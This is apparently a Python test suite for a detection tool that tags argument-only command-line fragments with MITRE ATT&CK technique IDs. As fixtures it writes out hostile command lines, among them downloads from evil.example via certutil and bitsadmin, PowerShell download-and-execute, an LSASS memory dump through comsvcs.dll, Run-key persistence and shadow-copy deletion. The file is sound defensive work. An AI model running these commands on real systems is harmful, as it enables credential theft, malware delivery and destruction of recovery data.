"""Feb 2026 · Fragment-mode MITRE mapping tests

Ensures that argument-only command-line fragments (missing their host
LOLBin) still produce MITRE tags. These came from analyst-supplied
Excel corpus where 9 of 11 rows had empty MITRE.
"""
from operations import mitre_map


def _ids(text: str):
    return {m["id"] for m in mitre_map(text)}


def test_fragment_bare_encoded_command():
    ids = _ids("-EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA==")
    assert "T1059.001" in ids


def test_fragment_bare_encoded_command_long_payload():
    long_b64 = "A" * 80 + "=="
    ids = _ids(f"-enc {long_b64}")
    # Both the base tag and the long-payload defense-evasion tag should fire
    assert "T1059.001" in ids
    assert "T1027.010" in ids


def test_fragment_command_iex_downloadstring():
    ids = _ids('-Command "IEX(New-Object Net.WebClient).DownloadString(\'http://x/y\')"')
    assert "T1059.001" in ids


def test_fragment_cmd_slashc_powershell_chain():
    ids = _ids('/c "set p1=power&& start powershell -w hidden -c IEX"')
    assert "T1059.003" in ids


def test_fragment_certutil_urlcache_args():
    ids = _ids("-urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe")
    assert "T1105" in ids


def test_fragment_certutil_decode_args():
    ids = _ids("-decode staged.b64 payload.exe")
    assert "T1140" in ids


def test_fragment_bitsadmin_transfer():
    ids = _ids("/transfer myJob http://evil.example/x.exe C:\\Users\\Public\\x.exe")
    assert "T1197" in ids


def test_fragment_rundll32_dll_export():
    ids = _ids('"C:\\Windows\\Temp\\payload.dll",StartServiceMain')
    assert "T1218.011" in ids


def test_fragment_rundll32_dll_ordinal_export():
    """Feb 2026 v1.3.0 · comsvcs.dll ordinal MiniDump (LSASS dump tradecraft)."""
    ids = _ids('C:\\windows\\System32\\comsvcs.dll, #+000024 1076 \\Windows\\Temp\\x.ttf full')
    assert "T1218.011" in ids
    assert "T1003.001" in ids  # ← comsvcs.dll ordinal → LSASS-dump primitive


def test_fragment_cmd_slashc_rundll32_lsass():
    """/c for /f ... rundll32 comsvcs LSASS tradecraft — fragment-mode T1059.003."""
    frag = ('/Q /c for /f "tokens=1,2 delims= " %A in ("tasklist /fi "Imagename eq lsass.exe" '
            '| find "lsass"") do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %B')
    ids = _ids(frag)
    assert "T1059.003" in ids
    assert "T1218.011" in ids
    assert "T1003.001" in ids


def test_fragment_reg_run_key_persistence():
    ids = _ids('add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "cmd /c payload.exe" /f')
    assert "T1547.001" in ids


def test_fragment_schtasks_create():
    ids = _ids('/create /tn "UpdaterTask" /tr "C:\\payload.exe" /sc onlogon')
    assert "T1053.005" in ids


def test_fragment_wmic_process_call_create():
    ids = _ids("process call create powershell.exe -c IEX")
    assert "T1047" in ids


def test_fragment_vssadmin_delete_shadows():
    ids = _ids("delete shadows /all /quiet")
    assert "T1490" in ids


def test_fragment_ps_stealth_flags():
    ids = _ids("-NoP -W Hidden -EP Bypass -c $x")
    assert "T1059.001" in ids


def test_fragment_standalone_long_base64():
    blob = "A" * 220 + "=="
    ids = _ids(f'"{blob}"')
    assert "T1027" in ids


def test_fragment_javascript_mshta_uri():
    ids = _ids('javascript:GetObject("script:http://evil/xxx.sct")')
    assert "T1218.005" in ids


def test_full_command_still_maps():
    """Regression — full commands (WITH the LOLBin present) must still work."""
    ids = _ids("powershell.exe -NoP -W Hidden -EncodedCommand " + "A" * 80)
    assert "T1059.001" in ids
